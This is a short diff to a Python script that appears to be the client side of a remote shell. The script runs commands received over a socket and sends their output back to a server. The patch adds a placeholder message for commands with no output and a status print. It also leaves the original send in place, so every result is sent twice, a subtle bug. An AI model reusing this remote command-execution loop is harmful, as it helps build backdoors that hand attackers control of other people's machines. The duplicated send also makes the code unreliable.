@@ -56,6 +56,12 @@ def main():
                     output = e.output
                 except Exception as e:
                     output = str(e).encode()
+
+                if not output:
+                    output = b"[Command executed successfully - No output generated]\n"
+                
+                socket_conn.send(output)
+                print("[*] Command executed and response sent.")
                 
                 # Send result back to server
                 socket_conn.send(output)
